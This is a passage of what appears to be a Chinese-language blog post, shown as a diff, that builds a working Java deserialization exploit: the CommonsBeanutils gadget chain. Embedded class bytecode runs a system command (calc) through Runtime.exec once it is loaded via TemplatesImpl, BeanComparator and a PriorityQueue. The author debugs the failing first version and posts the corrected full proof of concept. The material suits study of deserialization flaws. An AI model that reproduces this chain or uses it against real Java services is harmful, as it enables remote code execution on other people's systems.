47, 115, 117, 110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 120, 109, 108, 47, 105, 110, 116, 101, 114, 110, 97, 108, 47, 100, 116, 109, 47, 68, 84, 77, 65, 120, 105, 115, 73, 116, 101, 114, 97, 116, 111, 114, 59, 1, 0, 7, 104, 97, 110, 100, 108, 101, 114, 1, 0, 65, 76, 99, 111, 109, 47, 115, 117, 110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 120, 109, 108, 47, 105, 110, 116, 101, 114, 110, 97, 108, 47, 115, 101, 114, 105, 97, 108, 105, 122, 101, 114, 47, 83, 101, 114, 105, 97, 108, 105, 122, 97, 116, 105, 111, 110, 72, 97, 110, 100, 108, 101, 114, 59, 1, 0, 8, 60, 99, 108, 105, 110, 105, 116, 62, 1, 0, 1, 101, 1, 0, 21, 76, 106, 97, 118, 97, 47, 105, 111, 47, 73, 79, 69, 120, 99, 101, 112, 116, 105, 111, 110, 59, 1, 0, 13, 83, 116, 97, 99, 107, 77, 97, 112, 84, 97, 98, 108, 101, 7, 0, 42, 1, 0, 10, 83, 111, 117, 114, 99, 101, 70, 105, 108, 101, 1, 0, 9, 69, 118, 105, 108, 46, 106, 97, 118, 97, 12, 0, 10, 0, 11, 7, 0, 48, 12, 0, 49, 0, 50, 1, 0, 4, 99, 97, 108, 99, 12, 0, 51, 0, 52, 1, 0, 19, 106, 97, 118, 97, 47, 105, 111, 47, 73, 79, 69, 120, 99, 101, 112, 116, 105, 111, 110, 1, 0, 26, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 82, 117, 110, 116, 105, 109, 101, 69, 120, 99, 101, 112, 116, 105, 111, 110, 12, 0, 10, 0, 53, 1, 0, 4, 69, 118, 105, 108, 1, 0, 64, 99, 111, 109, 47, 115, 117, 110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 120, 97, 108, 97, 110, 47, 105, 110, 116, 101, 114, 110, 97, 108, 47, 120, 115, 108, 116, 99, 47, 114, 117, 110, 116, 105, 109, 101, 47, 65, 98, 115, 116, 114, 97, 99, 116, 84, 114, 97, 110, 115, 108, 101, 116, 1, 0, 57, 99, 111, 109, 47, 115, 117, 110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 120, 97, 108, 97, 110, 47, 105, 110, 116, 101, 114, 110, 97, 108, 47, 120, 115, 108, 116, 99, 47, 84, 114, 97, 110, 115, 108, 101, 116, 69, 120, 99, 101, 112, 116, 105, 111, 110, 1, 0, 17, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 82, 117, 110, 116, 105, 109, 101, 1, 0, 10, 103, 101, 116, 82, 117, 110, 116, 105, 109, 101, 1, 0, 21, 40, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 82, 117, 110, 116, 105, 109, 101, 59, 1, 0, 4, 101, 120, 101, 99, 1, 0, 39, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 80, 114, 111, 99, 101, 115, 115, 59, 1, 0, 24, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 84, 104, 114, 111, 119, 97, 98, 108, 101, 59, 41, 86, 0, 33, 0, 8, 0, 9, 0, 0, 0, 0, 0, 4, 0, 1, 0, 10, 0, 11, 0, 1, 0, 12, 0, 0, 0, 47, 0, 1, 0, 1, 0, 0, 0, 5, 42, -73, 0, 1, -79, 0, 0, 0, 2, 0, 13, 0, 0, 0, 6, 0, 1, 0, 0, 0, 9, 0, 14, 0, 0, 0, 12, 0, 1, 0, 0, 0, 5, 0, 15, 0, 16, 0, 0, 0, 1, 0, 17, 0, 18, 0, 2, 0, 12, 0, 0, 0, 63, 0, 0, 0, 3, 0, 0, 0, 1, -79, 0, 0, 0, 2, 0, 13, 0, 0, 0, 6, 0, 1, 0, 0, 0, 21, 0, 14, 0, 0, 0, 32, 0, 3, 0, 0, 0, 1, 0, 15, 0, 16, 0, 0, 0, 0, 0, 1, 0, 19, 0, 20, 0, 1, 0, 0, 0, 1, 0, 21, 0, 22, 0, 2, 0, 23, 0, 0, 0, 4, 0, 1, 0, 24, 0, 1, 0, 17, 0, 25, 0, 2, 0, 12, 0, 0, 0, 73, 0, 0, 0, 4, 0, 0, 0, 1, -79, 0, 0, 0, 2, 0, 13, 0, 0, 0, 6, 0, 1, 0, 0, 0, 26, 0, 14, 0, 0, 0, 42, 0, 4, 0, 0, 0, 1, 0, 15, 0, 16, 0, 0, 0, 0, 0, 1, 0, 19, 0, 20, 0, 1, 0, 0, 0, 1, 0, 26, 0, 27, 0, 2, 0, 0, 0, 1, 0, 28, 0, 29, 0, 3, 0, 23, 0, 0, 0, 4, 0, 1, 0, 24, 0, 8, 0, 30, 0, 11, 0, 1, 0, 12, 0, 0, 0, 102, 0, 3, 0, 1, 0, 0, 0, 23, -72, 0, 2, 18, 3, -74, 0, 4, 87, -89, 0, 13, 75, -69, 0, 6, 89, 42, -73, 0, 7, -65, -79, 0, 1, 0, 0, 0, 9, 0, 12, 0, 5, 0, 3, 0, 13, 0, 0, 0, 22, 0, 5, 0, 0, 0, 12, 0, 9, 0, 15, 0, 12, 0, 13, 0, 13, 0, 14, 0, 22, 0, 16, 0, 14, 0, 0, 0, 12, 0, 1, 0, 13, 0, 9, 0, 31, 0, 32, 0, 0, 0, 33, 0, 0, 0, 7, 0, 2, 76, 7, 0, 34, 9, 0, 1, 0, 35, 0, 0, 0, 2, 0, 36, &#125;&#125;;
         TemplatesImpl templates = new TemplatesImpl();
         Field fieldBytecodes = templates.getClass().getDeclaredField(&quot;_bytecodes&quot;);
@@ -400,30 +277,26 @@ public class CC4 &#123;
         fieldName.set(templates,&quot;aa&quot;);
         fieldTfactory.set(templates,new TransformerFactoryImpl());
 
+//        PropertyUtils.getProperty(templates, &quot;outputProperties&quot;);
 
-        Transformer[] transformers = new Transformer[]&#123;
-                new ConstantTransformer(TrAXFilter.class),
-                new InstantiateTransformer(new Class[]&#123;Templates.class&#125;,new Object[]&#123;templates&#125;)
-        &#125;;
-
-        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+        BeanComparator beanComparator = new BeanComparator(&quot;outputProperties&quot;,new AttrCompare());
 
 
-        TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer(1));
-        PriorityQueue&lt;Object&gt; priorityQueue = new PriorityQueue&lt;&gt;(1,transformingComparator);
+        PriorityQueue&lt;Object&gt; priorityQueue = new PriorityQueue&lt;&gt;();
         priorityQueue.add(2);
         priorityQueue.add(1);
 
-        Field field = transformingComparator.getClass().getDeclaredField(&quot;transformer&quot;);
-        field.setAccessible(true);
-        field.set(transformingComparator,chainedTransformer);
+
+
+        Field fieldComparator = PriorityQueue.class.getDeclaredField(&quot;comparator&quot;);
+        fieldComparator.setAccessible(true);
+        fieldComparator.set(priorityQueue,beanComparator);
+
 
         byte[] bytes = serialize(priorityQueue);
         unSerialize(bytes);
+
     &#125;
-
-
-
 
     public static byte[] serialize(Object obj) throws IOException &#123;
         ByteArrayOutputStream baos = new ByteArrayOutputStream();
@@ -438,6 +311,83 @@ public class CC4 &#123;
     &#125;
 &#125;
 </code></pre>
+<p>尝试执行 报错</p>
+<p>打断点看看</p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202404301617964.png" alt="image-20240430161716795"></p>
+<p>然后跟进发现是忘记反射改priorityqueue的queue了</p>
+<p>修改后正常</p>
+<pre><code class="java">package com.arcueid;
+
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import com.sun.org.apache.xml.internal.security.c14n.helper.AttrCompare;
+import org.apache.commons.beanutils.BeanComparator;
+import org.apache.commons.beanutils.PropertyUtils;
+import org.w3c.dom.Attr;
+
+import java.io.*;
+import java.lang.reflect.Field;
+import java.lang.reflect.InvocationTargetException;
+import java.util.Comparator;
+import java.util.PriorityQueue;
+
+/**
+ * Hello world!
+ *
+ */
+public class App 
+&#123;
+    public static void main( String[] args ) throws InvocationTargetException, IllegalAccessException, NoSuchMethodException, NoSuchFieldException, IOException, ClassNotFoundException &#123;
+
+        byte[][] _bytecodes = new byte[][]&#123;&#123;-54, -2, -70, -66, 0, 0, 0, 52, 0, 54, 10, 0, 9, 0, 37, 10, 0, 38, 0, 39, 8, 0, 40, 10, 0, 38, 0, 41, 7, 0, 42, 7, 0, 43, 10, 0, 6, 0, 44, 7, 0, 45, 7, 0, 46, 1, 0, 6, 60, 105, 110, 105, 116, 62, 1, 0, 3, 40, 41, 86, 1, 0, 4, 67, 111, 100, 101, 1, 0, 15, 76, 105, 110, 101, 78, 117, 109, 98, 101, 114, 84, 97, 98, 108, 101, 1, 0, 18, 76, 111, 99, 97, 108, 86, 97, 114, 105, 97, 98, 108, 101, 84, 97, 98, 108, 101, 1, 0, 4, 116, 104, 105, 115, 1, 0, 6, 76, 69, 118, 105, 108, 59, 1, 0, 9, 116, 114, 97, 110, 115, 102, 111, 114, 109, 1, 0, 114, 40, 76, 99, 111, 109, 47, 115, 117, 110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 120, 97, 108, 97, 110, 47, 105, 110, 116, 101, 114, 110, 97, 108, 47, 120, 115, 108, 116, 99, 47, 68, 79, 77, 59, 91, 76, 99, 111, 109, 47, 115, 117, 110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 120, 109, 108, 47, 105, 110, 116, 101, 114, 110, 97, 108, 47, 115, 101, 114, 105, 97, 108, 105, 122, 101, 114, 47, 83, 101, 114, 105, 97, 108, 105, 122, 97, 116, 105, 111, 110, 72, 97, 110, 100, 108, 101, 114, 59, 41, 86, 1, 0, 8, 100, 111, 99, 117, 109, 101, 110, 116, 1, 0, 45, 76, 99, 111, 109, 47, 115, 117, 110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 120, 97, 108, 97, 110, 47, 105, 110, 116, 101, 114, 110, 97, 108, 47, 120, 115, 108, 116, 99, 47, 68, 79, 77, 59, 1, 0, 8, 104, 97, 110, 100, 108, 101, 114, 115, 1, 0, 66, 91, 76, 99, 111, 109, 47, 115, 117, 110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 120, 109, 108, 47, 105, 110, 116, 101, 114, 110, 97, 108, 47, 115, 101, 114, 105, 97, 108, 105, 122, 101, 114, 47, 83, 101, 114, 105, 97, 108, 105, 122, 97, 116, 105, 111, 110, 72, 97, 110, 100, 108, 101, 114, 59, 1, 0, 10, 69, 120, 99, 101, 112, 116, 105, 111, 110, 115, 7, 0, 47, 1, 0, -90, 40, 76, 99, 111, 109, 47, 115, 117, 110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 120, 97, 108, 97, 110, 47, 105, 110, 116, 101, 114, 110, 97, 108, 47, 120, 115, 108, 116, 99, 47, 68, 79, 77, 59, 76, 99, 111, 109, 47, 115, 117, 110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 120, 109, 108, 47, 105, 110, 116, 101, 114, 110, 97, 108, 47, 100, 116, 109, 47, 68, 84, 77, 65, 120, 105, 115, 73, 116, 101, 114, 97, 116, 111, 114, 59, 76, 99, 111, 109, 47, 115, 117, 110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 120, 109, 108, 47, 105, 110, 116, 101, 114, 110, 97, 108, 47, 115, 101, 114, 105, 97, 108, 105, 122, 101, 114, 47, 83, 101, 114, 105, 97, 108, 105, 122, 97, 116, 105, 111, 110, 72, 97, 110, 100, 108, 101, 114, 59, 41, 86, 1, 0, 8, 105, 116, 101, 114, 97, 116, 111, 114, 1, 0, 53, 76, 99, 111, 109, 47, 115, 117, 110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 120, 109, 108, 47, 105, 110, 116, 101, 114, 110, 97, 108, 47, 100, 116, 109, 47, 68, 84, 77, 65, 120, 105, 115, 73, 116, 101, 114, 97, 116, 111, 114, 59, 1, 0, 7, 104, 97, 110, 100, 108, 101, 114, 1, 0, 65, 76, 99, 111, 109, 47, 115, 117, 110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 120, 109, 108, 47, 105, 110, 116, 101, 114, 110, 97, 108, 47, 115, 101, 114, 105, 97, 108, 105, 122, 101, 114, 47, 83, 101, 114, 105, 97, 108, 105, 122, 97, 116, 105, 111, 110, 72, 97, 110, 100, 108, 101, 114, 59, 1, 0, 8, 60, 99, 108, 105, 110, 105, 116, 62, 1, 0, 1, 101, 1, 0, 21, 76, 106, 97, 118, 97, 47, 105, 111, 47, 73, 79, 69, 120, 99, 101, 112, 116, 105, 111, 110, 59, 1, 0, 13, 83, 116, 97, 99, 107, 77, 97, 112, 84, 97, 98, 108, 101, 7, 0, 42, 1, 0, 10, 83, 111, 117, 114, 99, 101, 70, 105, 108, 101, 1, 0, 9, 69, 118, 105, 108, 46, 106, 97, 118, 97, 12, 0, 10, 0, 11, 7, 0, 48, 12, 0, 49, 0, 50, 1, 0, 4, 99, 97, 108, 99, 12, 0, 51, 0, 52, 1, 0, 19, 106, 97, 118, 97, 47, 105, 111, 47, 73, 79, 69, 120, 99, 101, 112, 116, 105, 111, 110, 1, 0, 26, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 82, 117, 110, 116, 105, 109, 101, 69, 120, 99, 101, 112, 116, 105, 111, 110, 12, 0, 10, 0, 53, 1, 0, 4, 69, 118, 105, 108, 1, 0, 64, 99, 111, 109, 47, 115, 117, 110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 120, 97, 108, 97, 110, 47, 105, 110, 116, 101, 114, 110, 97, 108, 47, 120, 115, 108, 116, 99, 47, 114, 117, 110, 116, 105, 109, 101, 47, 65, 98, 115, 116, 114, 97, 99, 116, 84, 114, 97, 110, 115, 108, 101, 116, 1, 0, 57, 99, 111, 109, 47, 115, 117, 110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 120, 97, 108, 97, 110, 47, 105, 110, 116, 101, 114, 110, 97, 108, 47, 120, 115, 108, 116, 99, 47, 84, 114, 97, 110, 115, 108, 101, 116, 69, 120, 99, 101, 112, 116, 105, 111, 110, 1, 0, 17, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 82, 117, 110, 116, 105, 109, 101, 1, 0, 10, 103, 101, 116, 82, 117, 110, 116, 105, 109, 101, 1, 0, 21, 40, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 82, 117, 110, 116, 105, 109, 101, 59, 1, 0, 4, 101, 120, 101, 99, 1, 0, 39, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 80, 114, 111, 99, 101, 115, 115, 59, 1, 0, 24, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 84, 104, 114, 111, 119, 97, 98, 108, 101, 59, 41, 86, 0, 33, 0, 8, 0, 9, 0, 0, 0, 0, 0, 4, 0, 1, 0, 10, 0, 11, 0, 1, 0, 12, 0, 0, 0, 47, 0, 1, 0, 1, 0, 0, 0, 5, 42, -73, 0, 1, -79, 0, 0, 0, 2, 0, 13, 0, 0, 0, 6, 0, 1, 0, 0, 0, 9, 0, 14, 0, 0, 0, 12, 0, 1, 0, 0, 0, 5, 0, 15, 0, 16, 0, 0, 0, 1, 0, 17, 0, 18, 0, 2, 0, 12, 0, 0, 0, 63, 0, 0, 0, 3, 0, 0, 0, 1, -79, 0, 0, 0, 2, 0, 13, 0, 0, 0, 6, 0, 1, 0, 0, 0, 21, 0, 14, 0, 0, 0, 32, 0, 3, 0, 0, 0, 1, 0, 15, 0, 16, 0, 0, 0, 0, 0, 1, 0, 19, 0, 20, 0, 1, 0, 0, 0, 1, 0, 21, 0, 22, 0, 2, 0, 23, 0, 0, 0, 4, 0, 1, 0, 24, 0, 1, 0, 17, 0, 25, 0, 2, 0, 12, 0, 0, 0, 73, 0, 0, 0, 4, 0, 0, 0, 1, -79, 0, 0, 0, 2, 0, 13, 0, 0, 0, 6, 0, 1, 0, 0, 0, 26, 0, 14, 0, 0, 0, 42, 0, 4, 0, 0, 0, 1, 0, 15, 0, 16, 0, 0, 0, 0, 0, 1, 0, 19, 0, 20, 0, 1, 0, 0, 0, 1, 0, 26, 0, 27, 0, 2, 0, 0, 0, 1, 0, 28, 0, 29, 0, 3, 0, 23, 0, 0, 0, 4, 0, 1, 0, 24, 0, 8, 0, 30, 0, 11, 0, 1, 0, 12, 0, 0, 0, 102, 0, 3, 0, 1, 0, 0, 0, 23, -72, 0, 2, 18, 3, -74, 0, 4, 87, -89, 0, 13, 75, -69, 0, 6, 89, 42, -73, 0, 7, -65, -79, 0, 1, 0, 0, 0, 9, 0, 12, 0, 5, 0, 3, 0, 13, 0, 0, 0, 22, 0, 5, 0, 0, 0, 12, 0, 9, 0, 15, 0, 12, 0, 13, 0, 13, 0, 14, 0, 22, 0, 16, 0, 14, 0, 0, 0, 12, 0, 1, 0, 13, 0, 9, 0, 31, 0, 32, 0, 0, 0, 33, 0, 0, 0, 7, 0, 2, 76, 7, 0, 34, 9, 0, 1, 0, 35, 0, 0, 0, 2, 0, 36, &#125;&#125;;
+        TemplatesImpl templates = new TemplatesImpl();
+        Field fieldBytecodes = templates.getClass().getDeclaredField(&quot;_bytecodes&quot;);
+        Field fieldName = templates.getClass().getDeclaredField(&quot;_name&quot;);
+        Field fieldTfactory = templates.getClass().getDeclaredField(&quot;_tfactory&quot;);
+        fieldBytecodes.setAccessible(true);
+        fieldName.setAccessible(true);
+        fieldTfactory.setAccessible(true);
+        fieldBytecodes.set(templates,_bytecodes);
+        fieldName.set(templates,&quot;aa&quot;);
+        fieldTfactory.set(templates,new TransformerFactoryImpl());
+
+//        PropertyUtils.getProperty(templates, &quot;outputProperties&quot;);
+
+        BeanComparator beanComparator = new BeanComparator(&quot;outputProperties&quot;,new AttrCompare());
+
+
+        PriorityQueue&lt;Object&gt; priorityQueue = new PriorityQueue&lt;&gt;();
+        priorityQueue.add(2);
+        priorityQueue.add(1);
+
+
+
+        Field fieldComparator = PriorityQueue.class.getDeclaredField(&quot;comparator&quot;);
+        fieldComparator.setAccessible(true);
+        fieldComparator.set(priorityQueue,beanComparator);
+
+        Field fieldQueue = PriorityQueue.class.getDeclaredField(&quot;queue&quot;);
+        fieldQueue.setAccessible(true);
+        fieldQueue.set(priorityQueue,new Object[]&#123;templates,1&#125;);
+        byte[] bytes = serialize(priorityQueue);
+        unSerialize(bytes);
+
+    &#125;
+
+    public static byte[] serialize(Object obj) throws IOException &#123;
+        ByteArrayOutputStream baos = new ByteArrayOutputStream();
+        ObjectOutputStream oos = new ObjectOutputStream(baos);
+        oos.writeObject(obj);
+        return baos.toByteArray();
+    &#125;
+
+    public static Object unSerialize(byte[] bytes) throws IOException, ClassNotFoundException &#123;
+        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bytes));
+        return  ois.readObject();
+    &#125;
+&#125;
+</code></pre>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202404301621223.png" alt="image-20240430162130689"></p>
 
     </div>
     
